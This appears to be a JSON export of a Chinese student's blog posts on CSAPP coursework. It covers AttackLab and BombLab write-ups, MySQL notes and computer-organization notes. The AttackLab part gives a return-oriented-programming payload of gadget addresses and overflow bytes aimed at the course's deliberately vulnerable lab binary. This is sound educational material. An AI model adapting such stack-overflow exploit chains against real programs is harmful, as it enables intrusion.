00 00 00 00 11 19 40 00 00 00 00 00 一定要把地址数清楚孩子们，因为有一个地址我没有数清楚而浪费了很长时间，不过解决段错误也是一种学习。（很难蚌的住啊）\nphase5: # 据说这是最难的一层，不过既然已经接触了汇编语言，那还是来试试看！\n解题思路来自于上面的Blog，在栈随机化的情况下，把rsp指针作为一个参考点来找到我们需要的参数。\n设计的asm：\nphase5.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0:\t48 89 e0 mov %rsp,%rax 3:\tc3 ret 4:\t48 89 c7 mov %rax,%rdi 7:\tc3 ret 8:\t58 pop %rax 9:\t90 nop a:\tc3 ret b:\t89 c1 mov %eax,%ecx d:\t90 nop e:\tc3 ret f:\t89 ca mov %ecx,%edx 11:\t84 c0 test %al,%al 13:\tc3 ret 14:\t89 d6 mov %edx,%esi 16:\t20 d2 and %dl,%dl 18:\tc3 ret 19:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax 1d:\t48 89 c7 mov %rax,%rdi 20:\tc3 ret 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1d 1b 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 c3 1a 40 00 00 00 00 00 48 00 00 00 00 00 00 00 c2 1b 40 00 00 00 00 00 2f 1b 40 00 00 00 00 00 17 1b 40 00 00 00 00 00 fa 1a 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 22 1a 40 00 00 00 00 00 31 34 65 36 36 34 36 66 00 00 00 00 00 00 00 00 大功告成！！！抄别人写的就是简单啊（），如果说有难度，那其实在于你要写一串没有bug的汇编然后去找，但是看别人的就不难了（？）。\n","date":"20 March 2025","externalUrl":null,"permalink":"/csapp/csappattacklab/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003eCSAPP:AttackLab \n    \u003cdiv id=\"csappattacklab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappattacklab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!WARNING]\u003c/p\u003e","title":"CSAPP:AttackLab","type":"csapp"},{"content":" 本期封面是笔者早期最喜欢的动漫角色之一，《とある科学の超電磁砲》中的长点上机学园的天才少女布束砥信，至今笔者的github头像都是她\u0026hellip;\u0026hellip;\nMySQL # 本文仅仅是笔者对于SQL语句的简单熟悉和复习的笔记，所以并不会对于更深刻的细节进行考究，也不会介绍怎么安装和配置MySQL的环境以及为什么我们要使用关系型数据库。\n1.Table # 创建表：有B格的创建一张表\n查看表结构：desc\ndelete:drop table if exists; 修改表字段\n**`alter table \u0026lt;name\u0026gt; add/change/modify \u0026lt;name\u0026gt; \u0026lt;name1\u0026gt;……`** **`alter table \u0026lt;name1\u0026gt; rename to \u0026lt;name2\u0026gt;`** delete from student; 绝对不要用这样的方式去清空一张表\n1.遍历删除，会浪费时间和资源\n2.若设置auto increment 主键，那么再加入数据的时候会从原来增长的部分继续\ntruncate table student; 直接报废表并且创建一张和原来一样的新表\n2.Data # update data:\n`update \u0026lt;tablename\u0026gt; set \u0026lt;field\u0026gt;=\u0026lt;newValue\u0026gt; where \u0026lt;field\u0026gt;=\u0026lt;value\u0026gt;;` search data from table:\n`select \u0026lt;fieldname,…\u0026gt; from \u0026lt;tablename\u0026gt;;` `select* from\u0026lt;tablename\u0026gt;` database definition language: create drop alter show\ndata manipulation language: insert delete update select\ndatabase control language: 关于数据库的角色控制？\n3.DataType # Decimal数据存储原理？\nenum枚举类型：仅能选取其中已经有的元素来存储，代表从一开始的数字\nset集合类型:能从集合中选取多个元素进行存储——用户兴趣标签\nset存储原理？？？\n4.列属性完整性(重点) # auto_increment 必须是 primarykey主键 primary key主键：唯一性—\u0026gt;一组或者一个字段 # 1.保证数据的完整性\n2.加快数据的查询速度—用来做表的关联\n`alter table \u0026lt;tablename\u0026gt; add primary key (\u0026lt;filedname\u0026gt;......);`添加主键，多个字段就是**组合键** `alter table \u0026lt;tablename\u0026gt; drop primary key;` 复合主键解决的问题\nunique唯一键\n和primary的区别：可以为null，不和其他表产生关联，但是必须唯一（null不唯一）\ndelete:`alter table \u0026lt;tablename\u0026gt; drop index \u0026lt;filedname\u0026gt;;` comment 注释问题\nSQL内注释和代码注释\n数据库的完整性问题\nForeign Key（外键约束技术） # 怎么在两张表之间建立联系？\n主表：\n建立从表：\n从表：\n`alter table \u0026lt;tablename\u0026gt; add foreign key (\u0026lt;filedname\u0026gt;) references \u0026lt;tablename\u0026gt;(\u0026lt;filedname\u0026gt;);` `show create table \u0026lt;tablename\u0026gt;;` 查看创建的表结构并且删除外键\n当主表中的数据发生变化的时候，从表中的数据应该如何修改？\n置空和级联的操作（在创建表的时候就要声明清楚） # 置空：主表中的数据被删除，那么从表中的数据依然保存，但是外键的被删除的字段为NULL；\n级联：主表中的数据发生修改，从表中的外键对应字段的数据全部发生修改；\n如图：删除——set null\n5.数据库设计思维 # a.基本概念 # 关系：两张表通过共同的字段来确立数据的完整性\n行——一条数据——实体\n列——一个字段——属性\n数据冗余：牺牲空间，提升查询性能（高考总分）\nb.实体之间的关系 # 一对多（学生表和食堂消费记录之间的关系）\n一对一\n多对一\n多对多\nc.范式 # Codd第一范式：确保字段的原子性，一个字段不可以再分 2018-2019 —— 2018 2019\nCodd第二范式：非键字段必须依赖于主键字段（无关的字段不应当加入，一张表只描述一种信息）\nCodd第三范式：消除传递依赖——根据实际情况，我们到底要不要考虑加入数据冗余的处理\n6.单表查询 # a.基本关键字 # select # from # 指定要查的表；返回两张表的笛卡尔积\ndual # 默认的一个虚拟表，单行单列\nwhere # 限制select查询条件 \u0026lt; ≤ \u0026gt; ≥ or and……\nin # 限定查询的字段的值在一个范围之内\nbetween…and… # 限制查询的范围在给定的闭区间内部\nis null # 查看是空或者非空，简单\n几种常见的聚合函数 # [!TIP]\n**Q:select count(*) and select count(1); **\nwhat’s the difference?\nlike模糊查询——通配符 # group by分组查询 # select \u0026lt;function-name\u0026gt;(\u0026lt;fieldname1\u0026gt;) as \u0026#39;alias1\u0026#39;, \u0026lt;fieldname2\u0026gt; as \u0026#39;alias2\u0026#39; group by \u0026lt;fieldname2\u0026gt;;#要根据哪个字段去查询 比如想求男性和女性的平均年龄：\n利用group_concat函数查询对应字段对应的实体\nhaving # 和where一样作为条件筛选，但是：\n1.where是根据条件对于实际存在于数据库中的数据进行筛选\n2.having对于查询之后的虚拟表使用——比如配合group_by(此时就不能使用where条件来处理)\nlimit # 选取顺序中的下标范围\nselect \u0026lt;fieldname\u0026gt; from \u0026lt;tablename\u0026gt; limit \u0026lt;start-index\u0026gt;,\u0026lt;length\u0026gt;; distinct # 去重复关键字\n默认情况下有all\nselect (all) \u0026lt;fieldname\u0026gt; from \u0026lt;tablename\u0026gt;; 至此，单表查询基础结束。\n7.多表查询 # 1.union # select… + union + DISTINCT + select… 对应字段个数必须相等\n2.join # 用两个表创建公共字段进行连接——内连接——有多张表就用多个inner进行连接\nselect f1,f2 from t1 inner join t2 on t1.f3=t2.f4 (having score \u0026gt; 90); left join 以左表为一个基准（就算左边没有也要写上去 right join 同理）\ncross join返回两张表的笛卡尔积\nselect* from t1 cross join t2; natural join自动寻找公共字段并且建立inner join的连接\n没有公共字段就返回cross join的结果\nusing\n当两张表的字段完全相同的时候，using指定建立连接的公共字段\n8.子查询 # 用一个select语句返回的数据范围作为限制的基准（用in和not in 来控制）\n只要存在就全部查询 exists and not exists\n至此，所有基础内容结束，以上的内容都是对于一名实习生来说最为重要的内容（每一种语法单独看来都是很好理解的，但是都联合起来的话就显得很困难），以下为扩展：\n扩展内容： # 1.视图(View) # 作用：简化SQL查询；掩盖敏感数据\n创建视图\n以后就可以直接查询\nalter修改视图\ndrop直接删除视图\n视图底层算法（在使用子查询创建视图的时候）\nunchecked\n1.temp table 临时表算法\n2.merge 合并算法\nQ:有什么区别？\n2.事务（Transaction） # 处理非常严谨的操作，例如转账等\n设置回滚点 并且返回—— rollback to\n事务的ACID特性\n原子：一个事务不可再分，要么全部执行，要么不执行\n隔离：多个事务同时对一个数据库进行操作，不会产生冲突\n注意：仅当engine=innodb的时候，才能使用事务\n3.index（索引） # 快速查询数据——实习生要理解到什么程度？\n4.存储过程 # 提前写好SQL一次执行，有点像函数\n利用delimiter设置结束符号\n企业规范约束 # 1.库表字段的约束规范 # 是否： is_vip unsigned tiny int length1️⃣ （不能浪费存储）\ndont’s\n不能有大写字母，\n不能以数字开头，\n下划线之间不能只有数字，\n不能出现负数，\n不能有关键字\n凡是有小数，必须用decimal数据类型\ndos\n主键：pk_key，\n字符串长度较小时，请使用char，\n强制存在的字段：\n1.id(unsigned bigint 单表的时候必须自增 primary key)\n2.create_time(datetime)\n3.update_time(datatime),\n2.索引规范 # 有某些必须：唯一索引\n不能查两个以上的关联查询\nvarchar上建立索引：建立索引的长度\n3.SQL开发约束 # count(xx,xxx,xx) count(*);\n判断为空的方法：\nwhere name = null ；\nwhere name is null；\n不要使用外键和级联（尤其是在高并发的项目中，牵一发而动全身）\n这些问题在Server层解决\n不允许使用存储过程（很难调试，其中的SQL写错了怎么办，和脚本不一样，移植性也很差）\nutf-8作为标准编码格式\n4.其他约束 # ORM框架查询不能写*\nQ:pujo类bool类型不能加is?\n","date":"12 March 2025","externalUrl":null,"permalink":"/tech/mysql/","section":"Tech","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是笔者早期最喜欢的动漫角色之一，《とある科学の超電磁砲》中的长点上机学园的天才少女布束砥信，至今笔者的github头像都是她\u0026hellip;\u0026hellip;\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003eMySQL \n    \u003cdiv id=\"mysql\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#mysql\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文仅仅是笔者对于SQL语句的简单熟悉和复习的笔记，所以并不会对于更深刻的细节进行考究，也不会介绍怎么安装和配置MySQL的环境以及为什么我们要使用关系型数据库。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e1.Table \n    \u003cdiv id=\"1table\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1table\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e创建表：有B格的创建一张表\u003c/p\u003e","title":"MySQL","type":"tech"},{"content":" 本期封面出自《轻音少女》的第20集，是我个人认为所看的动漫中印象最深刻的一集。\nComputer Organization # [!NOTE]\n在本篇之前，我已经实现了一个非常简单的CPU（感觉都是属于数字电路的内容，当然也是计组的一部分），课程笔记以及资源都来自于B站：Cs Primer。\n所以在这里只是简单记录一些感觉有必要的理论知识，还会不断补充。\nCache（存储器层次结构） # 1.DRAM SRAM SSD 机械硬盘读写以及存储，取内存和实际CPU之间的差异性。\n2.程序的局部性（Locality）:程序倾向于引用邻近于最近引用过的数据项或者是已经引用过的数据项本身（for遍历数组）\na.空间局部性 b.时间局部性\n引入：\n高速缓存存储器 # 1.结构 # SBE为总的大小。\n寻址原理：hash\n2.直接映射高速缓存（direct-mapped cache） # 就是每组只有一个行\n过程\na.组选择\n为什么把中间的位作为组索引而不是更高的位？\n如果高位做索引，那么很容易把一堆连续的块映射到一组高速缓存块里面，这样不符合空间局部性。\n中间的随机性相对更大一些。\nb.找到了组，进行行匹配\nc.根据块偏移位来寻找第一个字节的位置\nd.如果没有命中，从下一级内存中取相应的内存块并且直接做替换的操作\ne.实际过程：开始缓存为空，冷不命中，从L2中加载数据到L1,然后返回，接着假如标志位不相同，发生冲突不命中，进行替换操作。\nd.冲突不命中常见：thrash,高速缓存反复的加载和驱逐相同的一些组。\n3.组相联高速缓存(set associative cache) # 就是每个组包含多于一个的行\n和每个行进行一次匹配\nLFU和LRU策略\n4.全相联高速缓存（fully asscociative cache） # 就是只有一个组，里面有很多行\n没有组的选择，只有标记位和块偏移。\n单周期多周期处理器 # 一个时钟周期内完成一条指令\n多周期就是一条指令多个时钟周期\n流水线技术 # 五阶段流水线 # 把每个指令都填充成五个阶段，防止冲突\n流水线冒险 # 结构冒险：硬件资源产生冲突 # 数据冒险：逻辑上的数据依赖性产生冲突 # 控制冒险：跳转到别的指令，导致流水线之前准备的指令无效 # 解决：分支预测（动态）\n在X86系统上编写和运行程序 # 一个C程序处理流程 # 预处理-编译-汇编-链接-程序加载执行\n假设我们有文件main.c hello.c\ngcc main.c hello.c\t//这一条指令包含了上述的四个步骤 gcc -E hello.c -o hello.i //这表示对于文件进行预处理 -o是指定名称（擦除并且进行复制粘贴的流程） gcc -S hello.i -o hello.s\t//把预处理之后的文件处理成汇编代码 gcc -c hello.s -o hello.o\t//汇编成一个二进制文件，但是不进行链接的操作 工具：readelf（查看段的偏移） objdump（反汇编） hexdump（查看二进制文件的机器码）\ngcc main.o hello.o\t//直接将两个文件进行链接，如下是链接的过程 接着是程序加载执行的流程\n常见X86汇编指令 # 可以参照CSAPP熟悉基本语法，达到能读的要求即可\n[!TIP]\njmp类条件跳转指令之前可以跟其他许多指令\n比如 subl a,b 也可以看a和b之间满足的条件\n64位使用的寄存器 # 数据传送指令 # move：不能从内存直接到内存传送 # [!NOTE]\n我看过好几遍书，但是我感觉自己最难理解的地方就是函数的调用以及递归这里的东西，建议大家从push这里开始细细理解。\npush指令： # 1.把栈指针减去8,得到栈顶位置，此时栈顶还没有元素。2.把目的操作数放到栈顶。（push只要一个byte，栈上只是放了一堆data，和寄存器，和内存都没有关系）\n那么pop指令同理：1.把栈顶的值读入一个目标寄存器。2.把栈指针加8。\n条件控制 # if for while等语句都是条件跳转来实现的\nswitch语句当case范围较大时也是条件跳转，当范围较小是利用跳转表，一个连续数组的值域包含了所有的case情况(并且case的数量较多)\n*Process（过程） # 控制 + 传递 + 内存管理\n运行时栈（提前准备） # P去调用Q，首先存放返回地址，表明Q返回时从P的哪个位置开始执行，这个地址也是P栈帧的一部分。\n接着为Q分配一个栈帧，大多数的栈帧都是定长的，通过寄存器传递参数，如果大于6个，P在调用Q之前提前在自己的栈帧里存储好这些参数。\n转移控制（怎么交接控制权利） # call:把rip的值设置成callee的首地址，这样就把执行权利转换，接着把call指令下一条指令的地址压入栈中。\nret：把压入栈的地址弹出来，并且把rip的值设置成这个地址，这样就交还了控制权利。\n数据传送（怎么给Callee传递一些参数） # 在参数小于6个的情况下，我们直接用寄存器来传递，用rax来获得调用方法的返回值即可。\n在上图的Current frame中有一个Argument build area，这就是一个参数构造区，如果它也要调用一个参数多于6个的方法，那么就要提前在自己的栈帧里准备好，再执行call指令（注意：第七个参数会在栈的顶部）。\n栈上的局部存储（Callee中的局部变量是怎么实现的） # 比如局部变量太多，要取局部变量的一个地址，或者局部变量是数组及结构体等。\n还是上图，参数构造区之上就是我们减少栈指针分配给局部变量的空间。\n下例出自CSAPP\nlong swap_add (long *XP , long * yp) { long x = *xp ; long y = * yp ; *xp = y ; *yp = x ; return x + y ; } long caller () { //要处理以下两个局部变量，我就要为他们产生地址。 long argl = 534 ; long arg2 = 1057 ; long sum = swap_add (\u0026amp;argl , \u0026amp;arg2) ; long diff = argl - arg2 ; return sum * diff; } 以下是汇编代码\nlong caller() caller: subq $16 , %rsp movq $534 , (%rsp) movq $1057 , 8(%rsp) leaq 8(%rsp) , %rsi movq %rsp , %rdi call swap_add\t;这里的细节：方法虽然已经返回（返回之后之前压入的返回地址就会被弹出），但是栈帧还在，所以分配的局部变量还在 movq (%rsp) , %rdx subq 8(%rsp) ,%rdx imulq %rdx , %rax addq $16 , %rsp\t;此时栈帧不存在，会被后来的data覆盖掉 ret 栈帧分配到底拿来干嘛了？\n看下图：\n分配栈帧，先用来存放本方法要用的局部变量，接着是多于6个的参数从右至左依次压入栈中，然后call，注意，不要混淆局部变量和传递的参数，在被调用的方法中是不会用前一个方法栈帧中的局部变量的。\n寄存器中的局部存储空间 # 🔹 这些寄存器主要用于什么？ # 1. 存储局部变量 # （这也是一种存储局部变量的方法，比如在for循环中的index）\n如果一个函数有局部变量，但寄存器分配不足，编译器可能会把一些变量保存在被调用者保存寄存器里，避免频繁访问栈（比栈上的变量访问快）。\n2. 维持长期变量（Long-lived variables） # 如果某个变量在整个函数生命周期内都会被使用，而非临时数据，就可能放在 %rbx、%r12-%r15 这些寄存器里。\n3. 维护栈帧指针（%rbp） # 虽然现代编译器可能会省略栈帧指针（Frame Pointer Omission, FPO），但在调试模式下，%rbp 仍然用于保持当前函数的栈基址，帮助回溯调用栈。\n4. 传递跨函数调用的值 # 在一些情况下，如果一个值需要在多个函数调用之间保持不变，就可能存入被调用者保存寄存器，比如：\n递归函数中，某些参数可能需要跨多次递归调用保持不变。 在协程或上下文切换的代码里，某些寄存器可能存储特定的任务状态。 递归过程 # 到这里，理解递归过程就是简单的了，调用自己和调用任何一个过程都是类似的，每个函数都有自己的私有的栈帧。\n我们难理解的情况是栈帧里东西太复杂的情况。\n数组的分配和访问 # 1.指针访问，如果是地址，就用leaq加载有效地址，如果是取值就用mov指令即可。\n2.多维数组\n3.定长变长数组以及结构体\n关于缓冲区溢出问题 # C语言基础 # 关于位运算的技巧\n宏定义函数多行用\\分开，用do {\u0026hellip;\u0026hellip;} while(0)吃掉;（细节问题）\n内联函数：类似宏定义，调用的函数不跳转，直接展开，节约资源（根据编译器的情况而定)\nstatic inline int(...){......}\t//一般这样定义在头文件里使用 关于C语言不再赘述\n浮点数详解 # 浮点数存储形式 # （小数点浮动）进制转换（数字电路内容）\n[!NOTE]\nIEEE754典中典\n这里的尾数其实指的就是小数点之后的二进制表示：\n比如2.5 = 10.1b\n即 $$ 2.5 = 1.01*2^1 $$\n[!NOTE]\n这是一个规格化的浮点数，所谓规格化，我们默认一个浮点数是大于1的，即有一个隐含的前导1,我们只在尾数的23位中存储小数点的部分即可，但是如果指数部分为0,但是尾数不为0,这就是一个非规格化的浮点数，计算的规则已经发生了改变，此时的指数为1-bias，为了产生平滑的过渡。\n非规格化浮点数及舍入的问题 # 舍入：就近舍入，相同0优先\n指数部分越大，密度变小，精度就会变低\n浮点数的运算 # 先把指数设置相同，再相加这会导致大数吃掉小数的情况产生\n采用如下的累加算法\n比较问题：0.1 + 0.2 != 0.3（无限不循环小数相加导致的）\n[!NOTE]\n还有一个值得注意的点是转换类型时候的最近偶数舍入（银行家舍入），这有利于减少累积舍入的误差。\n课后作业 # 此时我们去做CSAPP的3个lab，并且把CSAPP2,3章的课后习题都解决一遍（我懒的写第二章了，我只写一下第三章的内容）\n1.datalab\n2.bomblab（gdb的使用，很有难度,我觉得可以先多看看书，做一下练习和课后习题，理解之后再去上手）\ngdb常用指令（来自https://arthals.ink/blog/bomb-lab作为参考的blog）\np $rax # 打印寄存器 rax 的值 p $rsp # 打印栈指针的值 p/x $rsp # 打印栈指针的值，以十六进制显示 p/d $rsp # 打印栈指针的值，以十进制显示 x/2x $rsp # 以十六进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2d $rsp # 以十进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2c $rsp # 以字符格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/s $rsp # 把栈指针指向的内存位置 M[%rsp] 当作 C 风格字符串来查看。 x/b $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 1 字节。 x/h $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 2 字节（半字）。 x/w $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 4 字节（字）。 x/g $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 8 字节（双字）。 info registers # 打印所有寄存器的值 info breakpoints # 打印所有断点的信息 delete breakpoints 1 # 删除第一个断点，可以简写为 d 1 3.attacklab（模拟攻击）\n[!NOTE]\n上述工作会花费很长时间，但是欲速则不达，如果难以下手，你可以参考CSDIY上的一些推荐博客。\n链接简单解读 # Static Linking # 可以理解是怎么把你写的多文件程序整合在一起运行。\n可重定位目标文件的分析(Relocatable File) # 单个文件汇编之后，后缀为.o的文件就是一个可重定位目标文件。\n（用以下的两个程序）\nreadelf -a main.o\t//分析elf文件内容 hexdump -C main.o\t//直接查看文件的二进制信息 符号表信息 # 弱符号和强符号 # 可执行文件 # 查看可执行文件的Program Header（可执行文件是怎么被加载执行的？）\nProgram Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align LOAD 0x001020 0x00800020 0x00800020 0x00198 0x00198 R E 0x1000 LOAD 0x002000 0x00801000 0x00801000 0x00038 0x00050 RW 0x1000 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 Section to Segment mapping: Segment Sections... 00 .text .rodata 01 .data .bss 02 静态链接的过程 # /* Simple linker script for os user-level programs. See the GNU ld \u0026#39;info\u0026#39; manual (\u0026#34;info ld\u0026#34;) to learn the syntax. */ //一个简单的linker脚本 OUTPUT_FORMAT(\u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;)\t//输出格式 OUTPUT_ARCH(i386)\t//架构类型 ENTRY(main)\t//程序的入口点（main函数） SECTIONS { /* Load programs at this address: \u0026#34;.\u0026#34; means the current address */ //在这个地址对程序进行加载 . = 0x800020; //以下都是把每个目标文件中的相同的段合并到新的段 .text : { *(.text .stub .text.* .gnu.linkonce.t.*) } PROVIDE(etext = .); /* Define the \u0026#39;etext\u0026#39; symbol to this value */ .rodata : { *(.rodata .rodata.* .gnu.linkonce.r.*) } /* Adjust the address for the data segment to the next page */ //转页进行存储，以上的页就可以设置成ro的一个页 . = ALIGN(0x1000); .data : { *(.data) } //记录下来，把.bss段设置成0 PROVIDE(edata = .); .bss : { *(.bss) } PROVIDE(end = .); /DISCARD/ : { *(.eh_frame .note.GNU-stack .comment) } } 重定位信息 # ","date":"10 March 2025","externalUrl":null,"permalink":"/csapp/computerorgnization/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面出自《轻音少女》的第20集，是我个人认为所看的动漫中印象最深刻的一集。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003e\u003cstrong\u003eComputer Organization\u003c/strong\u003e \n    \u003cdiv id=\"computer-organization\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#computer-organization\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!NOTE]\u003c/p\u003e\n\u003cp\u003e在本篇之前，我已经实现了一个非常简单的CPU（感觉都是属于数字电路的内容，当然也是计组的一部分），课程笔记以及资源都来自于B站：Cs Primer。\u003c/p\u003e","title":"ComputerOrgnization","type":"csapp"},{"content":" 本期封面是动漫《轻音少女》第一季时唯一律澪之间发生小矛盾的故事，此时，她们三个正在远远的看着mio\u0026hellip;\u0026hellip;\nCSAPP:BombLab # [!NOTE]\n本文主要参考博客：arthals.ink，如果你要学习方法，你只要看TA写的就可以了，我只看了前两层， 只是做个记录，我认为对于我来说很好的解决问题方式就是写注释(所以我这里有逐行的注释)。\ngdb指令：\np $rax # 打印寄存器 rax 的值 p $rsp # 打印栈指针的值 p/x $rsp # 打印栈指针的值，以十六进制显示 p/d $rsp # 打印栈指针的值，以十进制显示 x/2x $rsp # 以十六进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2d $rsp # 以十进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2c $rsp # 以字符格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/s $rsp # 把栈指针指向的内存位置 M[%rsp] 当作 C 风格字符串来查看。 x/b $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 1 字节。 x/h $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 2 字节（半字）。 x/w $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 4 字节（字）。 x/g $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 8 字节（双字）。 info registers # 打印所有寄存器的值 info breakpoints # 打印所有断点的信息 delete breakpoints 1 # 删除第一个断点，可以简写为 d 1 phase1: # 比较简单，就是对比一下字符串，熟悉一下。\n00000000000015ab \u0026lt;phase_1\u0026gt;: 15ab:\tf3 0f 1e fa endbr64 15af:\t48 83 ec 08 sub $0x8,%rsp 15b3:\t48 8d 35 f2 1a 00 00 lea 0x1af2(%rip),%rsi # 这很简单，你只要查看rsi里面存放了什么东西就可以 15ba:\te8 f3 05 00 00 call 1bb2 \u0026lt;strings_not_equal\u0026gt; 15bf:\t85 c0 test %eax,%eax 15c1:\t75 05 jne 15c8 \u0026lt;phase_1+0x1d\u0026gt; 15c3:\t48 83 c4 08 add $0x8,%rsp 15c7:\tc3 ret 15c8:\te8 f9 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 15cd:\teb f4 jmp 15c3 \u0026lt;phase_1+0x18\u0026gt; phase2: # 先看phase_2的代码，这是典型的循环\n00000000000015cf \u0026lt;phase_2\u0026gt;: 15cf:\tf3 0f 1e fa endbr64 # 用来防止ROP攻击 15d3:\t55 push %rbp # 两个局部变量 15d4:\t53 push %rbx 15d5:\t48 83 ec 28 sub $0x28,%rsp # 分配了40个字节 15d9:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值，用来防止恶意修改 15e0:\t00 00 15e2:\t48 89 44 24 18 mov %rax,0x18(%rsp) # 把金丝雀值保存起来，这样被修改的时候就会提醒 15e7:\t31 c0 xor %eax,%eax # ??? 15e9:\t48 89 e6 mov %rsp,%rsi # 栈指针的值赋给了rsi 15ec:\te8 2d 07 00 00 call 1d1e \u0026lt;read_six_numbers\u0026gt; # 调用一个读取6个数字的函数 15f1:\t83 3c 24 01 cmpl $0x1,(%rsp) # 第一个数字为1 15f5:\t75 0a jne 1601 \u0026lt;phase_2+0x32\u0026gt; 15f7:\t48 89 e3 mov %rsp,%rbx # rbx为当前栈顶的地址 15fa:\t48 8d 6c 24 14 lea 0x14(%rsp),%rbp # rbp存放rsp + 20bytes的地址 0 4 8 12 16 20刚好六个数字用栈传递 15ff:\teb 10 jmp 1611 \u0026lt;phase_2+0x42\u0026gt; # 无条件跳转1611 1601:\te8 c0 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1606:\teb ef jmp 15f7 \u0026lt;phase_2+0x28\u0026gt; 1608:\t48 83 c3 04 add $0x4,%rbx # 相等的情况下考察第二个参数的情况 160c:\t48 39 eb cmp %rbp,%rbx # 循环终止条件 160f:\t74 10 je 1621 \u0026lt;phase_2+0x52\u0026gt; 1611:\t8b 03 mov (%rbx),%eax # 取第一个参数到eax 1613:\t01 c0 add %eax,%eax # eax = eax * 2 1615:\t39 43 04 cmp %eax,0x4(%rbx) # 和第二个参数作比较 1618:\t74 ee je 1608 \u0026lt;phase_2+0x39\u0026gt; # 相等继续，不相等爆炸 161a:\te8 a7 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 161f:\teb e7 jmp 1608 \u0026lt;phase_2+0x39\u0026gt; 1621:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 1626:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 162d:\t00 00 162f:\t75 07 jne 1638 \u0026lt;phase_2+0x69\u0026gt; 1631:\t48 83 c4 28 add $0x28,%rsp 1635:\t5b pop %rbx 1636:\t5d pop %rbp 1637:\tc3 ret 1638:\te8 13 fc ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 再看它调用的读取六个数字的function\n0000000000001d1e \u0026lt;read_six_numbers\u0026gt;: 1d1e:\tf3 0f 1e fa endbr64 1d22:\t48 83 ec 08 sub $0x8,%rsp # 再分配8个字节 1d26:\t48 89 f2 mov %rsi,%rdx # 记住rsi是上一层栈顶的位置放到rdx这里 1d29:\t48 8d 4e 04 lea 0x4(%rsi),%rcx # 把这些参数用寄存器向下一个sscanf传递 1d2d:\t48 8d 46 14 lea 0x14(%rsi),%rax 1d31:\t50 push %rax 1d32:\t48 8d 46 10 lea 0x10(%rsi),%rax 